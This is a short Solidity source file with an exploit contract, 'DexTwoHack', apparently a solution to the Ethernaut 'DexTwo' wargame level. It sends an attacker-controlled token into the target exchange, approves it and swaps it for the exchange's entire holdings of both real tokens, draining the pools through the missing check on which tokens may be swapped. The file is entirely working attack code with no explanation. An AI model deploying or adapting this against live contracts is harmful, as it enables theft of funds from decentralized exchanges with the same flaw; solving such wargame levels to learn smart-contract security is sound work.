// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface IDexTwo {
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external returns (address);
    function token2() external returns (address);
}

contract DexTwoHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack(address evil) external {
        IERC20(evil).transfer(target, 100);
        (address token1, address token2) = (IDexTwo(target).token1(), IDexTwo(target).token2());
        IERC20(evil).approve(target, type(uint).max);
        IDexTwo(target).swap(evil, token1, 100);
        IDexTwo(target).swap(evil, token2, 200);
    }
}
